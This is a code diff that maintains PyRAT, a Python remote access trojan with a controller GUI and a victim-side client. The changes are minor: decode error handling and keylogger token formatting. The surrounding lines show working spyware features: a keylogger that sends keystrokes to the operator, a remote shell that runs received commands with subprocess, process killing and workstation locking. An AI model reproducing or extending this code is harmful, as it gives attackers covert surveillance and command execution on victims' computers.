@@ -359,7 +359,7 @@ class PyRAT:
                 self.disable()
                 self.B_logger.configure(text="exit", state="normal")
                 while self.Logging:
-                    key = self.client.recv(1024).decode(errors="ignore")
+                    key = self.client.recv(1024).decode(errors="replace")
                     if "<END_LOG>" in key or not key:
                         self.Logging = False
                         break
@@ -606,7 +606,7 @@ class PyRAT:
                 self.client.send(task.encode())
                 self.Error_Label.configure(text="")
                 self.Kill_Entry.delete("0", "end")
-                output = self.client.recv(2048).decode(errors="ignore")
+                output = self.client.recv(2048).decode(errors="replace")
                 print(output)
                 if output == "None":
                     self.Kill_Entry.delete("0", "end")
@@ -639,7 +639,7 @@ class PyRAT:
                     self.disable()
                     self.clear()
                     self.client.send("<KILL>".encode())
-                    out = self.client.recv(20480).decode(errors="ignore")
+                    out = self.client.recv(20480).decode(errors="replace")
                     self.Display.configure(state="normal")
                     self.Display.delete("1.0", tk.END)
                     self.Display.insert("1.0", out)
@@ -677,7 +677,7 @@ class PyRAT:
             try:
                 self.client.send("<INFO>".encode())
                 self.disable()
-                output = self.client.recv(10240).decode(errors="ignore")
+                output = self.client.recv(10240).decode(errors="replace")
                 self.enable()
                 self.Display.configure(state="normal")
                 self.Display.delete("1.0", tk.END)
@@ -808,10 +808,10 @@ class PyRAT:
     def recv_stats(self):
         def recv_share_stats():
             self.width_share, self.height_share, self.size_share = map(int,
-                                                                       self.client.recv(4096).decode().split(','))
+                                                                       self.client.recv(4096).decode(errors="replace").split(','))
 
         def recv_cam_stats():
-            self.width_cam, self.height_cam, self.size_cam = map(int, self.client.recv(4096).decode().split(','))
+            self.width_cam, self.height_cam, self.size_cam = map(int, self.client.recv(4096).decode(errors="replace").split(','))
 
         self.client.send("<STATS>".encode())
         recv_share_stats()
@@ -899,7 +899,7 @@ class PyRAT:
                 self.client, addr = self.server.accept()
 
                 if self.client:
-                    if self.client.recv(1024).decode() == "<PyRAT>":
+                    if self.client.recv(1024).decode(errors="replace") == "<PyRAT>":
                         self.client.send("<PyRAT>".encode())
                         self.recv_stats()
                         self.Connection_Label.configure(text=f"Connected: {addr[0]}", font=self.small_font)
@@ -997,11 +997,11 @@ class PyRAT:
 
                     self.Display.configure(state="normal")
                     self.client.send(command.encode())
-                    direct = self.client.recv(2048).decode(errors="ignore")
+                    direct = self.client.recv(2048).decode(errors="replace")
                     self.Display.insert(tk.END, f"{direct}> {command}\n")
                     self.Display.configure(state="disabled")
                     self.Shell_Entry.delete("0", "end")
-                    out = self.client.recv(12288).decode(errors="ignore")
+                    out = self.client.recv(12288).decode(errors="replace")
                     self.Display.configure(state="normal")
                     self.Display.insert(tk.END, f"{out}\n\n")
                     self.Display.yview_moveto(1)
@@ -1160,15 +1160,15 @@ def log(client):
         except AttributeError:
             special = str(key).replace("Key.", "")
             if special == "space":
-                client.send(" <SPACE> ".encode())
+                client.send("<SPACE>".encode())
             elif special == "tab":
-                client.send(" <TAB> ".encode())
+                client.send("<TAB>".encode())
             elif special == "enter":
-                client.send(" <RETURN> ".encode())
+                client.send("<RETURN>".encode())
             elif special == "backspace":
-                client.send(" <BACKSPACE> ".encode())
+                client.send("<BACKSPACE>".encode())
             elif special == "caps_lock":
-                client.send(" <CAPS_LOCK> ".encode())
+                client.send("<CAPS_LOCK>".encode())
 
         except ConnectionResetError:
             global Logging
@@ -1301,7 +1301,7 @@ def shell(client):
     global connected
     while local_shell:
         try:
-            command = client.recv(4096).decode(errors="ignore").strip()
+            command = client.recv(4096).decode(errors="replace").strip()
 
             if command == "<END_SHELL>":
                 local_shell = False
@@ -1328,10 +1328,10 @@ def shell(client):
 
                     else:
                         output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode(
-                            errors="ignore")
+                            errors="replace")
 
                 except subprocess.CalledProcessError as e:
-                    output = e.output.decode(errors="ignore")
+                    output = e.output.decode(errors="replace")
 
                 client.send(output.encode())
                 time.sleep(0.1)
@@ -1374,7 +1374,7 @@ def recv():
 
         try:
             global times
-            command = client.recv(8192).decode()
+            command = client.recv(8192).decode(errors="replace")
 
             if command == "<STATS>":
                 threading.Thread(target=send_stats, args=(client,)).start()
@@ -1462,12 +1462,12 @@ def recv():
                 os.system("rundll32.exe user32.dll,LockWorkStation")
 
             elif command == "<KILL>":
-                out = subprocess.check_output("tasklist", shell=True).decode(errors="ignore")
+                out = subprocess.check_output("tasklist", shell=True).decode(errors="replace")
                 client.sendall(out.encode())
                 pass
 
             elif command == "<KILLED>":
-                out = subprocess.check_output(f"taskkill /F /PID {r"{client.recv(1024).decode()}"}")
+                out = subprocess.check_output(f"taskkill /F /PID {r"{client.recv(1024).decode(errors='replace')}"}")
                 client.send(out)
 
             else:
